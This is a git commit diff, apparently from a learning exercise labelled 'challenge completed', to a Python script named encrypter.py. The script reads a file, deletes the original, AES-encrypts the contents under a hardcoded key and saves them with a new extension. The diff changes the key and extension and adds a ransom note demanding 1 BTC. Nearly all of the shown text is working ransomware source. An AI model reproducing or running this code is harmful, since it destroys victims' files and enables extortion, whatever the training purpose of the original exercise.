66d6093c05e17e78ef4a8d677ab0913810188050
alan7s <alan7@outlook.com>
2024-12-31 20:38:44 -0300

    desafio concluido

--- encrypter.py
+++ encrypter.py
@@ -11,14 +11,20 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"_catchmeifucan__"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
 crypto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
+new_file = file_name + ".lol"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
+
+## Mensagem de resgate
+msg = "Pay me 1 BTC to bc1p..."
+recovery_file = "recovery.txt"
+with open(recovery_file, "w") as recover:
+    recover.write(msg)
